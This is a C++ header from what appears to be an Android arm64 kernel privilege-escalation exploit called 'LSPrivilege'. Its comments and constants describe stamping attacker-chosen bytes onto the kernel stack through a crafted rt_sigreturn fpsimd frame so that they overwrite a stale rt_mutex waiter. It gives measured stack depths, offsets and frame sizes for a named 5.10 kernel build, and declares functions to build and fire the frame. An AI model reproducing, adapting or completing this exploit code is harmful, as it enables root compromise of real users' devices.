/*
 * LSPrivilege — sigreturn fpsimd stack stamp (shallow-frame 5.10 delivery).
 *
 * The multicast stamp delivery is replaced on kernels where the IPv4
 * msfilter copy window cannot reach the stale rt_mutex waiter. The payload
 * bytes are unchanged (encode_multicast_waiter writes task/lock at
 * waiter_off+task_offset / waiter_off+lock_offset); only the delivery syscall
 * differs: rt_sigreturn restores a crafted fpsimd_context whose kernel-side
 * user_fpsimd_state buffer sits at a fixed, much shallower stack depth that
 * covers the waiter.
 *
 * Geometry evidence (5.10.101-android12-9 katyusha, kprobe-measured):
 * the IPv4 msfilter path copies at most 0x108 bytes at stack depth 864 while
 * the waiter needs 480 bytes from the window start; the fpsimd restore copies
 * 512 vreg bytes into a 528-byte kernel stack buffer at depth 768, covering
 * waiter_off=320 (task/lock land at stamp offsets 368/376 = vregs[23]).
 */
#ifndef LSPRIVILEGE_ROUTE_SIGRETURN_STAMP_H
#define LSPRIVILEGE_ROUTE_SIGRETURN_STAMP_H

#include <cstddef>
#include <cstdint>

namespace lsprivilege::route {
    /* route.multicast_waiter stamp_delivery value selecting rt_sigreturn
     * fpsimd delivery instead of the multicast setsockopt copy. */
    inline constexpr uint32_t kStampDeliverySigreturn = 1;

    /* rt_sigframe access_ok budget checked by __arm64_sys_rt_sigreturn. */
    inline constexpr size_t kSigStampFrameBytes = 0x1250;

    /* user_fpsimd_state-shaped stamp: vregs[32] (512B), fpsr (4B), fpcr (4B).
     * Bytes beyond 520 are not delivered (the kernel buffer tail stays zero). */
    inline constexpr size_t kSigStampDeliveredBytes = 520;

    /* Build the rt_sigframe at `frame` (kSigStampFrameBytes, 16-aligned,
     * zeroed here). The stamp's 520 delivered bytes land at the kernel stack
     * window that covers the stale waiter. `blocked_mask` is restored verbatim
     * as uc_sigmask before the copy runs. */
    void build_sigreturn_stamp_frame(uint8_t *frame, const unsigned char *stamp,
                                     size_t stamp_size, uint64_t blocked_mask);

    /* Current thread's blocked signal set (8-byte arm64 sigset). */
    uint64_t current_blocked_sigmask();

    /* Fire rt_sigreturn with pt_regs->sp = frame. Control resumes at the
     * caller with x0 == 0 exactly like a normal call; a frame that fails any
     * kernel check kills the thread with SIGSEGV instead of returning. */
    extern "C" void lsprivilege_fire_sigreturn_stamp(void *frame);
} // namespace lsprivilege::route

#endif
